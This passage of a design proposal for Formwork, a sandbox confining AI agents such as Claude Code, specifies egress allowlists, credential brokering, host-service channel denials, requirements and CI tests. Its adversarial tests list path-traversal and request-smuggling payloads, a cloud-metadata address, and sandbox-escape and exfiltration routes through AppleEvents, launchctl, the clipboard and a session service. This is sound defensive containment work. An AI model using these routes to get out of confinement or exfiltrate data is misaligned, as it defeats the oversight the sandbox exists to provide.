([FW-CAP8](../formwork.md#fw-cap8) applied to channels). That is what makes the group useful for
turning things *off*: a team profile may `allow = ["desktop"]`, and a CI blueprint that extends it
writes `deny = ["desktop"]` and gets every member closed, with provenance showing which layer did it.
`--set 'channels = { deny = ["desktop"] }'` does the same from the command line; no new flag.

Deny-terminal has a consequence for shared files, and the team scenario (§10) made it concrete: a
committed blueprint must allow the *widest* channel set any member needs, and hosts that want less
narrow at the leaf (`--set 'channels = { deny = ["desktop"] }'` in the CI workflow). A base layer
that denies `desktop` "to be safe" locks every downstream user out for good, the same way an fs
`subtract` does. That is the landed fs model applied consistently, and it is stated in
`examples/README.md` next to the group.

`channels = "deny"` is the default *posture*, meaning an empty `allow` set; it is not a terminal
deny-all. Writing it explicitly in a base layer therefore does not lock the leaves out. Only entries
in a `deny` list are terminal.

An earlier draft also shipped `builtin:desktop`. It is withdrawn: two of four scenarios found it
either redundant (`channels = ["desktop"]` is already one word) or harmful (a team file already
names `builtin:default`, and the BP8 walk finds the project file before any personal one, so a
second builtin only helps a solo user with no team file). One embedded profile stays.

`explain desktop` (and `explain media`) prints the group's members, each member's verdict and
deciding layer, and — from `FW-FID10` — whether each is reachable on this host. A group name is
therefore also the operator's way to ask "what does my desktop expose to this agent right now".

- **TCC.** macOS attributes a child's privacy-sensitive access to the responsible app (the terminal
  or IDE). The camera, screen and input rows stop a confined agent from using TCC grants the user
  gave that app.
- **Keychain granularity.** Seatbelt gates the keychain as one service, not per item. Lifting
  `os-keyring` therefore opens every keychain item that does not prompt. It also lets the agent
  *trigger* keychain prompts, which the user sees as system dialogs.
  - The `explain` and report lines state both effects.
  - A narrower lift is not available on macOS. §8 records the options.
- **The agent examples cut across the baseline, and the design addresses it rather than finding out
  in the field.**
  - Claude Code on macOS stores its OAuth credential in the keychain **(characterize: item name)**
    and opens a browser to log in. `gh auth login --web` opens one too.
  - The `claude` Catalog type therefore gains a macOS location, the keychain service. This makes
    `allow-credentials = ["claude"]` lift `os-keyring` on macOS, with the granularity note in the
    report.
  - The Claude Code example lifts `desktop`. Because `open-url` is brokered, a standing grant costs
    nothing more than the login step did, and the per-run `--set` an earlier draft recommended is
    gone.
  - The OAuth callback: Claude Code's login listens on `localhost:<port>` inside the sandbox and the
    browser, outside it, connects back. On macOS `(deny network*)` also denies `network-bind` and
    `network-inbound`, so the profile re-allows both for `localhost:*` under every net posture
    (`FW-EGR8`). On Linux `bind`/`accept` are not mediated and need nothing. The §10 macOS scenario
    found this; without it the documented login flow fails and the operator falls back to pasting a
    code.
  - `FW-E2E-084` runs each shipped agent example on macOS CI with the baseline on.

### 3.5 Operator experience (usability criteria: explainability, defaults, CLI simplicity)

The mechanisms above add four new kinds of denial: host, request, channel and supervised socket.
Each one is explainable with the tools the operator already uses, and discoverable through `learn`.

- **`explain` takes the new kinds as positional arguments, typed by shape** ([FW-FID6](../formwork.md#fw-fid6)
  extended; no new subcommand):
  - `formwork explain https://api.github.com/repos/acme/x` gives the host-rule verdict, the method
    and path match, and the deciding rule with its provenance;
  - `formwork explain clipboard` gives the channel verdict and its lift;
  - `formwork explain /run/user/1000/bus` gives the socket verdict (Linux).

  Typing by shape means: a value with `scheme://` is a URL, a member of the channel enum is a
  channel, and anything else is a path.
- **`learn` proposes hosts and channels** (`FW-DISC12`). Two new denial sources reverse-compile into
  proposal entries, which go through the existing list/accept loop
  ([FW-DISC11](../formwork.md#fw-disc11)):
  - Gateway egress violations become `net.hosts` entries, with methods and paths when inspected;
  - channel denials become `channels` entries. The source on Linux is supervisor violations; on
    macOS it is unified-log `mach-lookup`/`lsopen`/`appleevent-send` denials, mapped back to the
    portable name.

  Some denials are withheld and never proposed, following the floor rule
  ([FW-DISC3](../formwork.md#fw-disc3)): metadata and private IPs ([FW-EGR4](fep-1.md#fw-egr4)),
  and `os-keyring`. The withheld items are itemized to the operator with the typed lift.

  `formwork learn -- claude` becomes the way to find the hosts an agent needs, instead of reading
  vendor documentation.
- **Refusals explain themselves at the point of use** (`FW-FID9`):
  - A Gateway refusal returns HTTP 403 with a one-line body naming the host or rule and the
    `formwork explain <url>` command.
  - A supervised `connect()` refusal gets `EACCES` plus one operator-channel line with the
    destination and the `explain` command.
  - A TLS client that rejects the session CA gets the §3.2 diagnosis.
- **Host-session disclosure** (`FW-FID10`). `detect` probes the facilities that make host-service
  channels reachable: on Linux the session bus, the user manager, display sockets and a keyring
  service under `$XDG_RUNTIME_DIR` (falling back to `/run/user/<uid>` when unset) and
  `/tmp/.X11-unix`; on macOS whether a GUI login session owns the process (`SessionGetInfo`). The
  probe lives in `detect` and its result in the `HostProfile`, so `compile` stays pure and
  byte-deterministic for a given profile ([FW-CAP5](../formwork.md#fw-cap5),
  [FW-FID4](../formwork.md#fw-fid4)); the embedder scenario caught the earlier draft putting a
  filesystem probe in the compiler. The report's channel lines then say, per channel, `reachable on
  this host` with the socket found, or `not present on this host`. A `Partial` that names
  `/run/user/1000/bus` is actionable; a `Partial` that names nothing on a headless server is
  correctly reassuring. `run`, `explain` and `compile --report-only` emit the same JSON key
  (`channel-<name>.host`), so an embedder can gate on it.
- **Resolved-input disclosure** ([FW-FID7](../formwork.md#fw-fid7)). `compile` and `explain` output
  names every value this FEP auto-chooses:
  - the Gateway listener endpoint;
  - the session CA path;
  - the per-session temp directory;
  - the `.formwork/` layout when discovered (D3).

  Placeholders are named by type, never by value.
- **Refusals never become an oracle for the agent.** [FW-CRED7](../formwork.md#fw-cred7) forbids
  telling the confined process which rule stopped it. The 403 body the agent sees therefore reads
  only `denied by formwork policy`; the rule, the layer and the `explain` invocation go to the
  operator channel. The embedder scenario flagged the earlier draft, which put the rule in the body.
- **Exit codes** (`FW-XR10`; mints `docs/unstated-requirements.md` item 12, which an embedder now
  needs). `run` keeps exiting with the workload's status. A Formwork failure after spawn exits `125`
  and prints one attribution line **on stderr**, prefixed `formwork:`. Examples: the Gateway dying,
  or the supervisor losing its listener. `125` is the value `git` and `docker` use for the same
  purpose. A workload that itself exits `125` is indistinguishable by code alone, so the line is the
  contract and the code is the convenience. Revised after §10: an earlier draft put the line on
  stdout as a "result", but `run` is a wrapper whose stdout *is the workload's* — for Omnigent's
  Claude SDK path it is the stream-json protocol — and a stray line there corrupts the harness
  exactly when the sandbox has failed. `run` has no result stream of its own; the exit code is its
  result.
- **`learn` from an empty universe.** Under `closed`, an enforced `learn` run dies on its first
  denial and proposes one path per pass. For bootstrapping a closed blueprint from zero, FEP-4's
  permissive recording (`learn --permissive`, `FW-DISC7`) is the tool, and the `learn` refusal text
  under `closed` with no grants names it. FEP-5 adds hosts and channels to what either mode
  observes.
- **Embedding.**
  - Generated blueprints need no temp file: `--blueprint /dev/fd/N` with the descriptor passed at
    spawn works with the landed flag, and the source is disclosed as `fd:N`
    ([FW-FID7](../formwork.md#fw-fid7)). An earlier draft added `--blueprint -`; the embedder
    scenario found that under `confine-self` stdin is the workload's protocol channel, so reading
    the blueprint from it hands the harness an exhausted stdin. The flag is withdrawn; FEP-5 adds no
    CLI flags.
  - A blueprint given by path or fd is never a discovery input: `protect_policy_inputs` protects
    the file it was given, and nothing is written into `$CWD/.formwork/` unless the blueprint was
    discovered there.
  - Setting `HTTP(S)_PROXY`: the Launcher sets them last and overrides an inherited value, with an
    operator-channel line when it did. An embedder that ran its own proxy has no use for it inside
    a host-allowlist session, since the Gateway is the only endpoint the kernel permits.
  - Releases also publish platform wheels carrying the signed binary, following the `ruff` and `uv`
    pattern, so a Python orchestrator can depend on Formwork directly.
- **Machine-readable report.** Every new report line has a stable JSON key in `compile
  --report-only` and `explain --json`, extending the landed `per_capability` map with these
  `Capability` values: `net-host-scope`, `net-inspection`, `net-udp`, `net-unix-socket`,
  `net-resolver`, `credential-broker`, `isolate-processes`, `isolate-ipc`, `private-tmp`,
  `channel-<name>` (one per channel), `privileged-interfaces`, `process-environment`. A channel
  entry carries `{ verdict, reason, host: { present, via } }`. Withheld `**/` rows (D1) are listed
  under a new `withheld: [...]` key. The shape is a Data-model surface (constitution) and versions
  with the report. The embedder scenario could not write its gate without this.

### 3.6 What stays asymmetric (reported, never hidden)

| Property | Linux | macOS | Why |
|---|---|---|---|
| Violation latency | Synchronous per `connect()` | Post-hoc (unified log) | Seatbelt has no notification channel |
| Egress endpoint authentication | By construction | Credential + peer-PID check | SBPL cannot scope `localhost` to a session |
| TLS inspection clients | All env-trust clients | Excludes Security.framework clients | No per-process trust on macOS |
| Keychain lift granularity | Per bus name (Secret Service as a whole) | Whole keychain channel | Seatbelt gates `securityd` as one service |
| Other processes' environment | `Partial` without `isolate` | `Enforced` (sysctl deny) | `ptrace_may_access` is outside Landlock's scope |
| Any-depth `**/` rows | `Partial` | `Enforced` | Landlock cannot root them |
| stat on denied paths | `Partial` | `Enforced` | kernel mechanism |
| `isolate` `processes` / `ipc` | `Enforced` where user namespaces exist | `Partial` or `Enforced` per characterization | no namespaces on macOS |
| Private tmp | directory form by default; tmpfs under `isolate` | directory form | no mount namespace on macOS |
| `os-keyring` lift | `Partial` (shares the session bus with `run-outside`) | `Enforced` (own mach service) | D-Bus routes by bus name inside the socket |
| ENOENT invisibility | Not provided | Not provided | `formwork.md` §3 non-goal |
| Enforcement API | stable kernel ABI | `sandbox_init` (deprecated, still shipped) | §8 |

---

## 4. Proposed requirements (draft numbering — anchored on landing)

These continue existing families: EGR, ISO, CRED, BP, FID, DISC and XR.

| Req | Requirement |
|---|---|
| `FW-EGR7` **Supervised connect (Linux)** | Under the host-allowlist posture on Linux, the Confiner shall deliver every `connect()` on AF_INET, AF_INET6 and AF_UNIX sockets to a supervisor outside the sandbox. The supervisor shall perform any allowed connection itself and install the result in the target, so that no confined process completes a `connect()` of its own. |
| `FW-EGR8` **Sole egress endpoint (macOS)** | Under the host-allowlist posture on macOS, the compiled profile shall permit outbound network only to `localhost:<P>` for the session's Gateway listener and to pathname sockets granted by `allow`. Under every net posture it shall permit `network-bind` and `network-inbound` on `localhost:*`, so a confined process can accept a loopback callback from an unconfined browser. |
| `FW-EGR9` **Registered egress** | The Gateway egress listener shall accept a connection only if its source endpoint was registered by the supervisor (Linux), or if it presents the session credential and its peer PID belongs to the session (macOS). |
| `FW-EGR10` **Inspected host rule** | For a host rule naming `methods`, `paths` or a brokered credential, the Gateway shall terminate TLS, verify that the SNI, the `Host` header and the CONNECT target agree, and admit a request only if its method and canonicalized path match the rule. |
| `FW-EGR11` **Request canonicalization** | Before matching, the Gateway shall remove dot-segments and decode percent-encoded unreserved characters. It shall reject a request with an encoded `/`, a NUL, a backslash in the path, or both `Content-Length` and `Transfer-Encoding`. |
| `FW-EGR12` **Resolver closure** | Under the host-allowlist posture, the Confiner shall deny every local name-resolution path: UDP and the resolver sockets on Linux, and the mDNSResponder literal on macOS. |
| `FW-EGR13` **Ephemeral CA** | The Gateway shall generate the inspection CA in memory per session. It shall not write the CA private key to any file, nor expose it to any confined process. |
| `FW-EGR14` **Gateway hosting** | `formwork run` in the spawn posture shall host the Gateway whenever the net posture is host-allowlist. Under `confine-self` with that posture, it shall refuse before exec, naming the spawn posture as the alternative. |
| `FW-CRED10` **Brokered credential** | For each `broker:<type>` entry in `allow-credentials`, and each inline `{ name, env, hosts, scheme }` binding, the Launcher and the Confiner shall strip and deny the credential's locations exactly as for an unlisted type ([FW-CRED4](../formwork.md#fw-cred4)). The Gateway shall hold the credential outside the sandbox. A type listed both bare and as `broker:` shall resolve to `broker`. |
| `FW-CRED11` **Credential presentation** | The Gateway shall present a brokered credential only on requests to its bound hosts, using the scheme bound to that host. When the request carries the session placeholder it shall substitute; when it carries no credential header it shall add one; when it carries the placeholder toward any other host it shall refuse with a violation record. When the type has an env var, the Launcher shall set it to the placeholder after the Catalog strip and the environment scrub. |
| `FW-CRED12` **Broker host closure** | The compiler shall reject a blueprint that brokers a credential whose bound hosts are absent from the host allowlist, naming the missing hosts. |
| `FW-TRA9` **Launcher-owned paths** | Paths the Launcher creates for a session — the session scratch holding the CA bundle, the private temporary directory, and an `open-url` shim directory — shall be granted (read, and write for the temporary directory) in every read mode, and named in the resolved-input disclosure ([FW-FID7](../formwork.md#fw-fid7)). |
| `FW-CRED13` **Service-located credentials** | The Catalog shall express credential locations that are services (macOS mach names, Linux bus names and sockets). It shall ship the `os-keyring` type, floor-denied by default, and map the `claude` type's macOS location to the keychain. |
| `FW-ISO10` **Isolation tier** | When a blueprint requests `isolate`, the Confiner shall apply each member (`processes`, `ipc`) using the §3.3 mechanism for the platform. It shall refuse before spawn any member the host cannot provide, naming each alternative the host offers, and print one operator-channel line for each member it provides as `Partial`. |
| `FW-ISO17` **`open-url` brokering** | When `open-url` is lifted, the Launcher shall place a Formwork-owned opener shim first in `PATH` and in `BROWSER`; the Gateway shall accept from it `http` and `https` URLs only, record each on the operator channel, and open it with the host opener outside the session. No host service shall be lifted for this channel on either platform. |
| `FW-ISO11` **UDP closure (Linux)** | Under the host-allowlist posture, the Confiner shall deny AF_INET and AF_INET6 `SOCK_DGRAM` socket creation. Under the port posture, the FidelityReport shall mark UDP unrestricted. |
| `FW-ISO12` **Pathname socket mediation (Linux)** | Under supervised connect, the supervisor shall refuse `connect()`, and `sendto`/`sendmsg` with an address, to a pathname AF_UNIX socket unless it is granted by `allow` or was bound by a process in the session. |
| `FW-ISO13` **Channel baseline** | In every blueprint, the Confiner shall deny each channel in the shipped baseline set that is not lifted by `channels` or by a typed credential exclusion, using the mechanism listed for its platform. The baseline set is the §3.4 table minus any channel the transparency gates (§1.1) moved to `strict`; the FidelityReport shall list each moved channel as `Partial`. Where the platform mechanism is unavailable (Linux without supervised connect), the FidelityReport shall mark the channel `Partial`. |
| `FW-BP9` **Channel policy shape** | The Blueprint shall express channel lifts as an `allow` scope and a terminal `deny` list over the closed channel enum and the fixed groups `desktop` (`clipboard`, `open-url`) and `media` (`screen`, `camera`, `microphone`). The keyword `"deny"` shall mean an empty `allow` scope, not a terminal list. Groups shall expand at the parse edge into their members; `allow` shall union across layers and `deny` entries shall be terminal from any layer; a lifted channel shall re-admit the environment variables its platform clients locate it by; `explain <group>` shall print each member's verdict, deciding layer, and host reachability (`FW-FID10`). |
| `FW-ISO14` **Privileged-interface baseline (macOS)** | The macOS profile shall deny `mach-priv-host-port`, `mach-priv-task-port`, and `iokit-open` outside the shipped IOKit allowlist. |
| `FW-ISO16` **Process-environment disclosure** | In every blueprint, the Confiner shall deny a confined process reading the environment of any process outside the session where the platform provides a mechanism (macOS `kern.procargs2` deny; Linux PID namespace under `isolate`). Where it does not (Linux without `isolate`), the FidelityReport shall mark it `Partial` and name the residual. |
| `FW-FID8` **Per-backend report lines** | The FidelityReport shall carry per-backend verdicts, each under a stable JSON key (§3.5), for: host scoping, inspection (with the client-trust caveat), UDP, pathname sockets, resolver closure, brokering, each `isolate` member, private tmp, each channel, privileged interfaces, and process-environment disclosure; and a `withheld` list naming every rule the backend could not install. |
| `FW-FID9` **Self-explaining refusals** | For each refusal this FEP introduces — Gateway 403s, supervised-connect denials, opener-shim refusals, and TLS `unknown_ca` rejections of the session CA — Formwork shall emit on the operator channel, within the run, one line naming what was refused, the deciding rule, and the `explain` invocation that reproduces the verdict. The confined process shall receive only a generic refusal ([FW-CRED7](../formwork.md#fw-cred7)). |
| `FW-FID10` **Host-session disclosure** | `detect` shall probe for the host facilities that make each §3.4 channel reachable (session bus, user manager, display server, keyring service; GUI session on macOS) and for nesting inside a PID namespace, and record them in the HostProfile. The FidelityReport shall state per channel whether it is reachable on this host and through which socket or service, or that it is not present. |
| `FW-DISC12` **Host and channel discovery** | `learn` shall reverse-compile Gateway egress violations and channel denials into proposal entries (`net.hosts`, `channels`) on both backends. It shall withhold, and itemize to the operator, metadata and private-IP destinations and credential-typed channels. |
| `FW-XR10` **Exit-code contract** | Wrapper subcommands shall exit with the workload's status and write nothing of their own to stdout. A Formwork failure after the workload is spawned shall exit `125` and emit one `formwork:`-prefixed line on stderr attributing the failure to Formwork. |

Invariants:

- `FW-INV13` **Broker non-disclosure.** A brokered credential's bytes do not appear in:
  - a confined process's environment;
  - a file or service the process can read;
  - any Gateway response to it.
- `FW-INV14` **No out-of-sandbox execution.** A confined process cannot, through any channel in §3.4
  that its blueprint has not lifted, cause a process outside its session to:
  - execute a command;
  - open a URL;
  - perform network egress.

### 4.1 Test design: CI-first, paired, and never passing vacuously

CI runs both OSes, so every test below is written to run on a hosted runner. Following the
constitution's Testing section and `docs/unstated-requirements.md` items 4 and 10, each test obeys
these rules:

- **Control run first.** Each negative test first runs its probe *unconfined* and asserts that the
  channel is live on this runner — the marker file is written, the clipboard round-trips, the fixture
  receives the request. Only then does it run the probe confined and assert the denial.
  - This is the paired allow/deny rule applied to host services. Without the control, a test on a
    runner that has no pasteboard server would pass while proving nothing.
- **Not exercised is a failure in CI.** When the control run fails, the test skips locally with the
  reason. In CI, `FW_REQUIRE_EXERCISED=1` turns that skip into a failure: a platform test that never
  ran on its platform is a claim, not a verification.
- **Positive assertion of the denial.** Tests assert the denial record — the supervisor's violation,
  the unified-log `deny` line (the [FW-E2E-064](../formwork.md#fw-e2e-064) feed), the 403 body — not
  only the absence of a side effect. Absence is checked too, after the process tree has exited, not
  by waiting.
- **Least convenient shape.** Every probe is the fastest-failing workload: a process that dies on its
  first denial within milliseconds. This covers macOS channel denials, whose feed has the
  unified-log latency window.
- **Hermetic escape markers.** No test depends on Safari, Finder, or a TCC grant. Each "run
  outside" or "open" channel is exercised against a **fixture app** built by the test: a minimal
  `.app` bundle whose executable writes a marker file into a directory the confined process cannot
  write. If the marker exists, code ran outside the sandbox. `open -g -n fixture.app` exercises
  LaunchServices, `launchctl submit` exercises launchd, and an AppleEvent to the fixture app
  exercises `appleevent-send`.
  - Where a TCC consent would be needed for the *control* run on a hosted runner, the test asserts
    only the confined-side sandbox deny record. It declares itself `deny-record-only` in the
    traceability table, so the evidence level is visible.
- **The runner is headless, like the evaluation host, so the suite brings the session.** The
  Omnigent evaluation missed the Linux host-service gap because its container had no session bus,
  display or keyring to reach. A CI runner has none either, so a test that merely tries `xdg-open`
  or `gdbus` on a bare runner passes vacuously. Every Linux channel test therefore:
  - starts its own session `dbus-daemon` (with `DBUS_SESSION_BUS_ADDRESS` set for the control run
    only);
  - starts a fixture socket service that runs commands it receives, a stand-in for `systemd --user`
    with the same socket shape, listening under a per-test `$XDG_RUNTIME_DIR`;
  - starts `Xvfb` for a display socket under `/tmp/.X11-unix`;
  - proves each is live with the control run before asserting the confined denial.

  The traceability table records, per test, which facilities the run provided. A desktop-only
  facility that CI cannot provide (a real `systemd --user` instance, a Wayland compositor) is listed
  as `fixture-only` evidence, and the requirement's report line is what covers the difference on a
  real desktop (`FW-FID10`).
- **Fixture services, not mocks.**
  - The Linux channel tests use the session facilities above; none is mocked.
  - The egress tests use FEP-1's loopback fixtures and resolver fixture.
  - These are real subprocess servers, as the MCP fixtures are.
- **Traceability.** Every test carries its `fw_e2e` / `fw_adv` marker and `macos` / `linux` marker,
  so the generated table shows which platform executed which requirement.

**CI changes** (the constitution's first-party-actions rule holds; nothing third-party is added):

| Change | Why |
|---|---|
| Add `macos-15` to the test matrix alongside `macos-14` | Seatbelt service names and `sysctl` behavior change across releases. Characterization runs on the current and previous major. |
| Add `ubuntu-24.04` alongside `ubuntu-22.04` | 24.04 restricts unprivileged user namespaces through AppArmor, so the `isolate` refusal path (XR9) is exercised on a runner, not assumed |
| Install `dbus` and `xvfb` on Linux runners | Session-bus and display fixtures for `FW-E2E-082` and `FW-E2E-087`; both are distribution packages, not third-party actions |
| Set `FW_REQUIRE_EXERCISED=1` in CI | Not-exercised fails instead of skipping |
| Run the README quickstart and each `examples/` agent blueprint on both OSes | D1, and `FW-E2E-084` |

### 4.2 Tests (draft)

The macOS characterization suite (§8) runs first. Its results decide the **(characterize)** marks;
the requirement tests below depend on it.

- `FW-E2E-075` **Sole egress path (both).** Under `net = { hosts = ["allowed.test"] }`:
  - a request through `HTTP_PROXY` reaches the fixture;
  - each of the following is denied, with a violation record:
    - a direct `connect()` to the fixture;
    - a direct `connect()` to `169.254.169.254`;
    - an unregistered or uncredentialed connection to the listener;
    - a UDP send;
    - `getaddrinfo("blocked.test")`.
- `FW-E2E-076` **Pathname socket (both).** Three sockets, each with an unconfined control:
  - one bound by an out-of-session fixture is refused;
  - one granted by `allow` connects;
  - one bound in-session connects.
- `FW-E2E-077` **Inspected path scope (both).** Under `POST allowed.test/repos/acme/**`:
  - `POST /repos/acme/x` passes;
  - `POST /repos/other/x` is refused with a 403 whose body names the rule (`FW-FID9`);
  - `GET /repos/acme/x` is refused.
- `FW-E2E-078` **Brokered header (both).**
  - The fixture receives the real `x-api-key`.
  - Confined `env` shows the placeholder.
  - Reading the catalog file is denied.
  - The placeholder sent to `other.test` is refused.
  - `FW-INV13` is checked by grepping every confined-readable surface the test can enumerate for the
    credential bytes.
- `FW-E2E-079` **Isolation tier (Linux, both runners).**
  - On `ubuntu-22.04`, with `isolate = ["processes"]`:
    - `/proc` lists only session PIDs;
    - `$TMPDIR` is a tmpfs, empty and unshared;
    - `kill` of a host PID fails.
  - On `ubuntu-24.04`, the run is refused before spawn, and the message names AppArmor, the
    `sysctl` remedy, bwrap, and dropping the member (XR9).
- `FW-E2E-080` **Isolation tier (macOS).** With the same request:
  - `kill` and `proc_pidinfo` on an unconfined control sibling fail.

  The report's `processes` verdict matches what `ps` still shows.
- `FW-E2E-089` **Private tmp and Launcher-owned paths under `closed` (both).** A blueprint with
  `mode = "unveil"` and only `readwrite:$CWD/**`:
  - `$TMPDIR` is set, inside the session, and writable; on macOS `confstr(_CS_DARWIN_USER_TEMP_DIR)`
    resolves beneath it;
  - the session CA bundle is readable by a grandchild process;
  - a grandchild reads `/proc/self/status` and `/etc/hosts` (D11);
  - `explain` names the tmp directory and the CA path as resolved inputs.
- `FW-E2E-090` **Brokered `open-url` (both).** With `channels = ["open-url"]`:
  - the confined `xdg-open`/`open` of an `https://` URL causes the fixture opener on the host to
    receive it, and the operator channel records it;
  - a `file:` URL is refused with a violation record;
  - `lsopen` (macOS) and the session bus (Linux) remain denied throughout, checked with the
    `FW-E2E-081`/`082` probes in the same session.
- `FW-E2E-091` **Loopback callback (macOS).** A confined process binds `localhost:<ephemeral>`, an
  unconfined control process connects and sends a nonce, and the confined process receives it, under
  `net = "deny"`, `ports` and `hosts`.
- `FW-E2E-081` **Channels (macOS).** Under the default profile, each of the following is denied with
  a sandbox deny record, and no marker appears:
  - `open -g -n fixture.app`;
  - `launchctl submit` of a marker job;
  - an AppleEvent to the fixture app;
  - `pbcopy` / `pbpaste` of a nonce;
  - `security find-generic-password` against a test item created with `-A`, in a test keychain.

  Then:
  - with `channels = ["clipboard"]`, only the clipboard probe succeeds;
  - with `allow-credentials = ["os-keyring"]`, only the keychain probe succeeds.
- `FW-E2E-082` **Channels (Linux).** Against a session `dbus-daemon` and the fixture service, under
  supervised connect, each of these is denied with a violation record:
  - `gdbus call --session`;
  - the fixture's "run this" request;
  - a connection to a fixture X11-shaped socket.

  With the matching lifts, each succeeds.
- `FW-E2E-083` **Environment disclosure (both).** An unconfined sibling carries `FW_CANARY=<nonce>`
  in its environment.
  - Control: `ps -E` (macOS) or `/proc/<pid>/environ` (Linux) shows the nonce.
  - macOS, confined under the **default** profile: not shown.
  - Linux, confined under the default profile: shown, and the report says `Partial` with the residual
    (the [FW-E2E-025](../formwork.md#fw-e2e-025) honesty pattern); under `isolate = ["processes"]`
    on `ubuntu-22.04`: not shown, and the report says `Enforced`.
- `FW-E2E-084` **Agent examples under the baseline (both).** Each shipped `examples/` blueprint runs
  its agent's non-interactive smoke command with the baseline on, with zero denials outside the
  lift set the example documents. The Claude Code example's login flow (browser open through the
  shim, loopback callback) is exercised with the fixture opener standing in for the browser.
- `FW-E2E-085` **Discovery of hosts and channels (both).** `learn` runs a millisecond workload that
  does two things and exits: hits `blocked.test` through the proxy, and touches the clipboard.
  - It proposes `net.hosts = ["blocked.test"]` and `channels = ["clipboard"]`.
  - A workload that hits `169.254.169.254` produces a withheld line, not a proposal.
- `FW-E2E-087` **Host-session disclosure (both).**
  - Linux, bare runner: `detect` reports each channel `not present on this host`.
  - Linux, with the §4.1 fixture session running under a per-test `$XDG_RUNTIME_DIR`: `detect`
    names the bus socket, the user-manager socket and the display socket, and `run` prints the
    matching `Partial` line naming them. The same run under supervised connect prints `Enforced`.
  - macOS runner: `detect` reports the GUI-session verdict, and the channel lines match `FW-E2E-081`.
- `FW-E2E-088` **Channel groups (both).**
  - `channels = ["desktop"]`: the clipboard and URL-open probes from `FW-E2E-081`/`082`/`090`
    succeed; `screen` and `run-outside` are denied; on Linux `DISPLAY`/`WAYLAND_DISPLAY` are present
    in the confined environment and `DBUS_SESSION_BUS_ADDRESS` is not.
  - The same blueprint plus a downstream layer `channels = { deny = ["desktop"] }`: both probes are
    denied, and `explain desktop` names the denying layer.
  - A base layer with `channels = "deny"` and a downstream `channels = ["clipboard"]`: the clipboard
    probe succeeds (the keyword is a posture, not a terminal list).
  - `channels = { allow = ["desk"] }` fails at parse and the error lists the valid names and groups.
- `FW-E2E-086` **Exit-code contract (both).**
  - A workload exiting 3 makes `run` exit 3, and `run` writes nothing to stdout of its own.
  - Killing the Gateway mid-run makes `run` exit 125, with the attribution line on stderr and
    stdout untouched.
- `FW-ADV-016` **Gateway frame bypass (D6).** A batch array, a non-JSON frame, and an id-less
  `tools/call` for a shaded tool each fail to reach the backend.
- `FW-ADV-017` **Path traversal against an inspected rule.** Each of the following is refused or
  canonicalizes out of scope:
  - `/repos/acme/../other/x`;
  - `/repos/acme/%2e%2e/other/x`;
  - `/repos/acme%2F..%2Fother/x`;
  - a CL+TE smuggle.
- `FW-ADV-018` **Supervisor race (Linux).** A second thread rewrites the `sockaddr` while `connect()`
  is pending. The connection lands only where the supervisor's copy was allowed.
- `FW-ADV-019` **Endpoint theft (macOS).** An unconfined same-uid process holding `P` and the
  credential connects to the listener. Pass, either way:
  - the peer check refuses it; or
  - if characterization found the peer check unreliable, the report is `Partial` and names this
    residual.
- `FW-ADV-020` **Exfiltration through a host service (both).** Under
  `net = { hosts = ["allowed.test"] }`, the agent tries to send a nonce to the `blocked.test`
  fixture through each channel:
  - `open` of the fixture app with a URL argument;
  - an AppleEvent;
  - the Linux fixture service running `curl`;
  - a clipboard hand-off to an unconfined reader.

  The nonce never reaches the fixture. Checked after the process tree exits.

---

## 5. Parity after this FEP

Conditional on the characterization suite confirming the **(characterize)** marks.

| Capability | Omnigent Linux | Omnigent macOS | Formwork Linux after | Formwork macOS after |
|---|---|---|---|---|
| Mandatory egress host allowlist | Enforced (netns) | Enforced (SBPL) | Enforced (supervisor) | Enforced (SBPL + authenticated listener) or `Partial` per characterization |
| Method/path rules | Enforced, not canonicalized | Same | Enforced, canonicalized | Enforced for env-trust clients; platform-verifier clients refused |
| Credential injection | `Authorization` only; CA key on disk | Same | Any header scheme; ephemeral CA; floor holds | Same, with the client-trust caveat |
| Private IP / metadata block | Enforced | Enforced | Enforced under `AllowHosts` ([FW-EGR4](fep-1.md#fw-egr4)) | Same |
| UDP / local resolver | Closed | Closed | Closed under `AllowHosts`; reported under `Ports` | Same |
| Pathname AF_UNIX | Unreachable (not mounted) | Denied | Mediated | Enforced (literals) |
| Host-service channels | Closed | Partly (mach open) | Closed under supervised connect, else `Partial` | Closed; keychain lift is whole-channel |
| Privileged interfaces | seccomp | Not granted | seccomp | Denied, IOKit allowlist |
| Other processes' env | Hidden | Open **(characterize)** | `Partial` by default (same-uid readable, reported); `Enforced` under `isolate` | Blocked, default-on |
| Process visibility / IPC / tmp | Namespaces | Self-only signal/info | Opt-in, namespaces | Opt-in, filters |
| Runs without user namespaces | No | n/a | Yes, except `isolate` `processes`/`ipc` | n/a |
| Explain / learn for egress and channels | No | No | Yes | Yes |
| Windows | Job Object only | — | Not provided (non-goal) | — |

---

## 6. Surface changes (each measured against Growth)

- **Blueprint fields.** Two are new; two are extended. (An earlier draft had three new fields and a
  second embedded profile; §10 removed `broker-credentials`, `isolate`'s `tmp` member and
  `builtin:desktop`.)
  - **`net` (extended).** `net = { hosts = [...] }` is FEP-1's `AllowHosts`. An entry is either a
    host string or a table `{ host, methods, paths }` (a TOML 1.0 mixed array). A bare string stays
    a host-only rule. Two entries for the same host union their rules. The grammar, pinned here
    because an embedder must translate into it:
    - `host`: an exact DNS name, or `*.example.com` for one or more labels under `example.com`
      (the apex is not included; write it separately). This closes FEP-1's open host-pattern
      question. IP literals are accepted and, for private ranges, are the explicit naming
      [FW-EGR4](fep-1.md#fw-egr4) requires.
    - `port`: optional, default 443; plain HTTP (`port = 80`) is proxied unencrypted and reported
      so.
    - `methods`: a list of HTTP methods, or `["*"]`.
    - `paths`: a list of globs over the canonicalized path without query: `*` matches one segment,
      `**` any depth, `?` one character; default `["/**"]`. The same grammar Omnigent uses, so
      `egress_rules` translate one to one.
  - **`allow-credentials` (extended).** Entries are a bare Catalog type (expose, unchanged),
    `broker:<type>`, or an inline binding table `{ name, env, hosts, scheme }` for a credential the
    Catalog does not know. One list governs the Catalog; the earlier `broker-credentials` list and
    its parse-error intersection are gone.
  - **`channels`** — `"deny"` (default) or `{ allow, deny }` over a closed enum (`run-outside`,
    `open-url`, `clipboard`, `screen`, `camera`, `microphone`) plus two fixed groups (`desktop`,
    `media`); a bare list is sugar for `allow`. A typo fails at parse and lists the valid names
    (`deny_unknown_fields` discipline). The `{ allow, deny }` shape is the one MCP policy already
    uses, so there is no second way to spell allow-with-terminal-deny.
    - Rejected alternative: `allow:service:<mach-name>` in `rules`. It put platform names in
      blueprints and broke [FW-XR6](../formwork.md#fw-xr6).
    - Rejected alternative: a separate top-level `desktop = true` switch. It would be a second
